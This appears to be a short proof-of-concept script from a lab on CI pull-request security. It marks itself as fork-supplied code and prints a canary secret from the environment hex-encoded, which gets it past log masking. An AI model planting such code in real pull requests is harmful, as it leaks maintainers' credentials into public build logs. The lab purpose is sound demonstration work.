console.log("lab-step: POC MARKER - code supplied by fork PR");
console.log("lab-step: CANARY_HEX =",
  Buffer.from(process.env.CANARY_SECRET || "").toString("hex"));
